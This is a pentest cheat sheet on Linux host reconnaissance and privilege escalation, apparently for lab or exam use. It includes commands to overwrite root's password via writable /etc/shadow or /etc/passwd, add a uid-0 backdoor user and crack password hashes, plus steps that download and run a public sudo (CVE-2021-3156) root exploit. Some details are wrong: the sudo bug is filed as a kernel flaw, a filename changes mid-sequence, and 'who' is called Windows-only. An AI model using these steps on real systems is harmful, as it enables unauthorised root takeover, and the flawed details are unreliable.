---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Linux

{% hint style="warning" %}
Run [`linPEAS`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), [`linux-exploit-suggester`](https://github.com/The-Z-Labs/linux-exploit-suggester), [`lse`](https://github.com/diego-treitos/linux-smart-enumeration) for enumerating privilege escalation vectors!
{% endhint %}

## Host Recon

### Get Help

```bash
# List available commands
compgen -c | sort | less
compgen -a | sort | less

# Help for a specified command
man <command>
<command> --help
```

### Networking

{% tabs %}
{% tab title="Network Info" %}
General networking information, such as interfaces, IP addresses, and DNS:

```bash
ip addr show
ip a
ifconfig -a # deprecated

# Show interfaces
ip link show
```
{% endtab %}

{% tab title="ARP Table" %}
Check recent communications via the ARP table:

```bash
ip route
ip neigh
```
{% endtab %}

{% tab title="Active Connections" %}
List active TCP and UDP connections:

```bash
ss -tulnp
netstat -tulnp # deprecated
```
{% endtab %}

{% tab title="Routes" %}
List recent and persistent routes:

```bash
ip route show
ip r
route -n # legacy
```
{% endtab %}
{% endtabs %}

### System

{% hint style="warning" %}
[`pspy`](../../tools/infra/pspy.md) can be used on the target to enumerate real-time system information!
{% endhint %}

{% tabs %}
{% tab title="General Info" %}
{% code overflow="wrap" %}
```bash
# General system information
neofetch
hostnamectl
uname -a

# Name of the host
hostname

# Kernel version & distro info
uname -r
cat /etc/os-release

# Terminal history file
cat ~/.bash_history
cat ~/.zsh_history
history

# Environment variables
printenv
env

# Named pipes
ls -l /proc/sys/fs/pipe-max-size
lsof

# sudo version
sudo --version
```
{% endcode %}
{% endtab %}

{% tab title="Packages" %}
```bash
# Installed packages

# Debian / Ubuntu (APT-based)
dpkg -l
apt list --installed

# RedHat / CentOS / Fedora (RPM-based)
rpm -qa
dnf list installed
yum list installed

# Arch Linux / Manjaro (Pacman)
pacman -Q

# Snap packages
snap list

# Flatpak packages
flatpak list

# Homebrew (macOS or Linux)
brew list --versions
```
{% endtab %}

{% tab title="Processes" %}
```bash
# List running processes
ps aux

# Information about a specific process
ps -p <PID> -f
cat /proc/<PID>/status
```
{% endtab %}

{% tab title="Services" %}
```bash
ps -eo pid,cmd
systemctl
```
{% endtab %}
{% endtabs %}

### Users & Groups

{% tabs %}
{% tab title="Users" %}
{% code overflow="wrap" %}
```bash
# Current user
whoami

# List current user's privileges
sudo -l

# List current user's information
id
getent passwd $(whoami)

# List local users
cut -d: -f1 /etc/passwd
getent passwd

# List active (logged-on) users (works only on Windows Servers)
who

# Elevated permissions
sudo -l
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
```bash
# List current user's groups
groups
id -Gn

# List local groups
getent group

# List group members
getent group <group>
```
{% endtab %}
{% endtabs %}

### Files

{% tabs %}
{% tab title="General" %}
{% code overflow="wrap" %}
```bash
# List all (including) hidden files
ls -la

# Include subdirectories
ls -laR

# Search for a specific file
find / -type f -name "local.txt" 2>/dev/null
locate local.txt

# Case-insensitive search
find / -type f -iname "local.txt" 2>/dev/null
```
{% endcode %}
{% endtab %}

{% tab title="SUIDs" %}
{% code overflow="wrap" %}
```bash
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
```
{% endcode %}
{% endtab %}

{% tab title="Shadow" %}
Check permissions:

```bash
ls -l /etc/shadow
```

If it is writable, create/modify a user:

```bash
# Generate a new password hash
openssl passwd -1 -salt xyz newpassword
# Replace root's password with the new one
echo 'root:$1$xyz$YOUR_GENERATED_HASH' | chpasswd -e
# Switch to root
su - root
```

If it is readable, copy `shadow` and `passwd` locally and crack them:

{% code overflow="wrap" %}
```bash
# Unshadow files
unshadow passwd shadow > hashes.txt
# Crack with john
john --wordlist=rockyou.txt hashes.txt
# Crack with hashcat
hashcat -m1800 hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}

{% tab title="Passwd" %}
Check the file's permissions:

```
ls -l /etc/passwd
```

If it is writable:

{% code overflow="wrap" %}
```bash
# Generate a new hash
openssl passwd -1 -salt evil password123
# Place the hash between the first and second ':' of root
sed -i 's/^root:[^:]*:/root:$1$evil$F9LZzU/LJjH7ZQZzJX.Zn1:/' /etc/passwd
# Or append root's info to the bottom, changing 'root' to a new user (e.g. 'newroot')
echo "newroot:\$1\$evil\$F9LZzU/LJjH7ZQZzJX.Zn1:0:0:root:/root:/bin/bash" >> /etc/passwd
# Switch user
sudo su
sudo newroot
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Scheduled Jobs

```bash
# Print jobs
crontab -l
cat /etc/crontab
cat /var/log/syslog | grep "CRON"
```

## Kernel Exploits

## <= 5.8

Vulnerable to [Dirty Pipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) ([CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847)).

### 5.4.0-128-generic

Vulnerable to **heap-based buffer overflow** ([CVE-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156)).

```bash
# Check the kernel's version
$ uname -a
Linux web01 5.4.0-128-generic #144-Ubuntu SMP Tue Sep 20 11:00:04 UTC 2022 x86_64 

# Check the target's sudo version
$ sudo --version
Sudo version 1.8.31
```

There is a working [PoC](https://github.com/worawit/CVE-2021-3156/tree/main) available:

{% code overflow="wrap" %}
```bash
# Download the PoC to the target
$ wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py

# Assign execute permissions
$ chmod +x exploit.py

# Run the exploit
$ ./exploit_nss.py
...
# id
uid=0(root) gid=0(root) groups=0(root),998(apache),1004(anita)
```
{% endcode %}
